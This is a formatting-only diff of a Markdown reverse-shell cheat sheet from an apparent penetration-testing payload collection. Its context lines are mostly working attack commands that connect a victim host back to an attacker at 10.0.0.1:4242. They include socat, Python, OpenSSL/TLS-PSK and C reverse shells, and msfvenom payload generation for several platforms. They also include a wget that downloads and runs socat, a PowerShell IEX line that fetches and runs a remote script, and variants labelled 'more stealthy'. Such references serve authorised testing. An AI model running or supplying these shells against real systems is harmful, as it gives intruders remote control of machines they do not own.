@@ -3,35 +3,35 @@
 ## Summary
 
 * [Reverse Shell](#reverse-shell)
-    * [Bash TCP](#bash-tcp)
-    * [Bash UDP](#bash-udp)
-    * [Socat](#socat)
-    * [Perl](#perl)
-    * [Python](#python)
-    * [PHP](#php)
-    * [Ruby](#ruby)
-    * [Golang](#golang)
-    * [Netcat Traditional](#netcat-traditional)
-    * [Netcat OpenBsd](#netcat-openbsd)
-    * [Ncat](#ncat)
-    * [OpenSSL](#openssl)
-    * [Powershell](#powershell)
-    * [Awk](#awk)
-    * [Java](#java)
-    * [Java Alternative 1](#java-alternative-1)
-    * [Java Alternative 2](#java-alternative-2)
-    * [War](#war)
-    * [Lua](#lua)
-    * [NodeJS](#nodejs)
-    * [Groovy](#groovy)
-    * [Groovy Alternative 1](#groovy-alternative-1)
-    * [C](#c)
+  * [Bash TCP](#bash-tcp)
+  * [Bash UDP](#bash-udp)
+  * [Socat](#socat)
+  * [Perl](#perl)
+  * [Python](#python)
+  * [PHP](#php)
+  * [Ruby](#ruby)
+  * [Golang](#golang)
+  * [Netcat Traditional](#netcat-traditional)
+  * [Netcat OpenBsd](#netcat-openbsd)
+  * [Ncat](#ncat)
+  * [OpenSSL](#openssl)
+  * [Powershell](#powershell)
+  * [Awk](#awk)
+  * [Java](#java)
+  * [Java Alternative 1](#java-alternative-1)
+  * [Java Alternative 2](#java-alternative-2)
+  * [War](#war)
+  * [Lua](#lua)
+  * [NodeJS](#nodejs)
+  * [Groovy](#groovy)
+  * [Groovy Alternative 1](#groovy-alternative-1)
+  * [C](#c)
 * [Meterpreter Shell](#meterpreter-shell)
-    * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
-    * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
-    * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
-    * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
-    * [Other platforms](#other-platforms)
+  * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
+  * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
+  * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
+  * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
+  * [Other platforms](#other-platforms)
 * [Spawn TTY Shell](#spawn-tty-shell)
 * [References](#references)
 
@@ -63,6 +63,7 @@ Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tc
 user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
 user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
+
 ```powershell
 user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
@@ -86,16 +87,19 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c
 Linux only
 
 IPv4
+
 ```python
 export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 ```
 
 IPv4
+
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 IPv6
+
 ```python
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 ```
@@ -166,6 +170,7 @@ ncat --udp 10.0.0.1 4242 -e /bin/bash
 ### OpenSSL
 
 Attacker:
+
 ```powershell
 user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
@@ -176,10 +181,11 @@ user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -
 ```
 
 TLS-PSK (does not rely on PKI or self-signed certificates)
+
 ```bash
 # generate 384-bit PSK
 # use the generated string as a value for the two PSK variables from below
-openssl rand -hex 48 
+openssl rand -hex 48
 # server (attacker)
 export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
 # client (victim)
@@ -226,6 +232,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 #### Java Alternative 2
+
 **NOTE**: This is more stealthy
 
 ```java
@@ -243,7 +250,6 @@ thread.start();
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
 ```
-
 
 ### Lua
 
@@ -303,6 +309,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 #### Groovy Alternative 1
+
 **NOTE**: This is more stealthy
 
 ```java
@@ -329,11 +336,11 @@ int main(void){
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
@@ -342,7 +349,7 @@ int main(void){
     char * const argv[] = {"/bin/sh", NULL};
     execve("/bin/sh", argv, NULL);
 
-    return 0;       
+    return 0;
 }
 ```
 
@@ -375,16 +382,16 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >revers
 ### Other platforms
 
 ```powershell
-$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
-$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
-$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
-$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
-$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
-$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
+msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
+msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
+msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
+msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
 
 ## Spawn TTY Shell
@@ -457,14 +464,14 @@ www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
 www-data@debian:/dev/shm$ su - user
 Password: P4ssW0rD
 
-user@debian:~$ 
+user@debian:~$
 ```
 
 ## Fully interactive reverse shell on Windows
+
 The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
 
 **ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
-
 
 Server Side:
 
@@ -478,7 +485,7 @@ Client Side:
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
-Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
+Offline version of the ps1 available at --> <https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1>
 
 ## References
 
